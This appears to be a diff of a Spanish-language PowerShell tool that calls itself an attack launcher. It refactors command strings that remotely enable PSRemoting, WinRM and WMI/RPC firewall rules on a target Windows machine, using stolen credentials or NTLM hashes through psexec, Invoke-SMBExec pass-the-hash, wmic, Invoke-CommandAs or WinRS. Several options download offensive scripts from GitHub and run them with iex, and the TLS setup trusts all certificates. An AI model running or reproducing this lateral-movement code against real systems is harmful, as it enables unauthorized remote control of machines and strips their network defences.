@@ -54,6 +54,11 @@ function EnableTLS {
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
     [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }
 
+$Ps1="Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
+$Ps2="netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes"
+$Ps3="netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes"
+$Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes"
+
     do { 
     Show-Menu
     $input = Read-Host -Prompt "Elige cómo quieres lanzar el ataque"
@@ -70,10 +75,10 @@ function EnableTLS {
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe" -UseBasicParsing
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Ps1" -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Ps2" -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Ps3" -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Ps4" -accepteula
         del .\psexec.exe }
 
         '2' {
@@ -109,10 +114,10 @@ function EnableTLS {
         Write-Output "computer=$computer" > file.txt
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose }
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps1" -verbose
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps2" -verbose
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps3" -verbose
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe $Ps4" -verbose }
         
 	'3' {
         Write-Host ""
@@ -124,10 +129,10 @@ function EnableTLS {
 	$PlainTextPassword = ConvertFrom-SecureToPlain $password
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes"
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes"
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }
+        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Ps1"
+        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Ps2"
+        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Ps3"
+        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Ps4" }
 
         '4' {
         Write-Host ""
@@ -140,10 +145,10 @@ function EnableTLS {
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
 	(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" }
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" }
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" }
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }}
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "$Ps1" }
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "$Ps2" }
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "$Ps3" }
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "$Ps4" }}
 
         '5' {
         Write-Host ""
@@ -155,10 +160,10 @@ function EnableTLS {
 	Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
 	$PlainTextPassword = ConvertFrom-SecureToPlain $password
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" 
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" 
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" 
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps1" 
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps2" 
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps3" 
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps4" }
 		
         'X' { exit }
 
